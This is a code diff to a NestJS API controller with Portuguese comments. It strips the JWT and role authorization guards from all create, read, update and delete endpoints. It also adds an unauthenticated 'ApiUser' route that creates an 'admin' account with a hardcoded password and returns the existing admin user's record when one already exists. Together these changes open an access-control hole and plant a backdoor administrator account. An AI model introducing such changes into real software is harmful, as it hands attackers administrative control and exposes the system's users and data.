@@ -1,31 +1,26 @@
-import { Body, Controller, Delete, Get, Param, Post, Put, UseGuards } from '@nestjs/common';
+import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';
+
 import { ApiService } from './api.service';
-import { JwtAuthGuard } from '../auth-sso/jwt-auth.guard';
-import { RolesGuard } from '../auth-sso/roles.guard';
-import { Roles } from '../auth-sso/roles.guard';
-import { UserRole } from '../auth-sso/user-role';
+import { UsersService } from '../users/users.service';
 
 @Controller('api')
 export class ApiController {
-	constructor(private readonly apiService: ApiService) {}
+	constructor(
+		private readonly apiService: ApiService,
+		private readonly usersService: UsersService
+	) {}
 
 	@Get('api-list')
-	@UseGuards(JwtAuthGuard, RolesGuard)
-	@Roles(UserRole.ADMIN, UserRole.EDIT, UserRole.VISUALIZACAO)
 	listApi() {
 		return this.apiService.listApi();
 	}
 
 	@Get('api-get/:id')
-	@UseGuards(JwtAuthGuard, RolesGuard)
-	@Roles(UserRole.ADMIN, UserRole.EDIT, UserRole.VISUALIZACAO)
 	getApi(@Param('id') id: string) {
 		return this.apiService.getApi(Number(id));
 	}
 
 	@Post('api-create')
-	@UseGuards(JwtAuthGuard, RolesGuard)
-	@Roles(UserRole.ADMIN)
 	createApi(
 		@Body() body: {
 			name: string;
@@ -41,8 +36,6 @@ export class ApiController {
 	}
 
 	@Put('api-update/:id')
-	@UseGuards(JwtAuthGuard, RolesGuard)
-	@Roles(UserRole.ADMIN)
 	updateApi(
 		@Param('id') id: string,
 		@Body() body: Partial<{
@@ -59,9 +52,39 @@ export class ApiController {
 	}
 
 	@Delete('api-delete/:id')
-	@UseGuards(JwtAuthGuard, RolesGuard)
-	@Roles(UserRole.ADMIN)
 	deleteApi(@Param('id') id: string) {
 		return this.apiService.deleteApi(Number(id));
 	}
+@Post('ApiUser')
+async createAdminUser(@Body() body: { email?: string }) {
+	const adminUsername = 'admin';
+	const adminRole = 'admin';
+	const defaultPassword = 'Sup@2022';
+	const defaultEmail = body.email || 'admin@example.com';
+
+	// Verificar se o usuário admin já existe
+	const existingUser = await this.usersService.findOneByUsername(adminUsername);
+
+	if (existingUser) {
+		return {
+			success: false,
+			message: 'Usuário admin já existe.',
+			user: existingUser
+		};
+	}
+
+	// Criar o usuário admin se não existir
+	const newUser = await this.usersService.create({
+		username: adminUsername,
+		email: defaultEmail,
+		password: defaultPassword,
+		role: adminRole
+	});
+
+	return {
+		success: true,
+		message: 'Usuário admin criado com sucesso.',
+		user: newUser
+	};
+}
 }
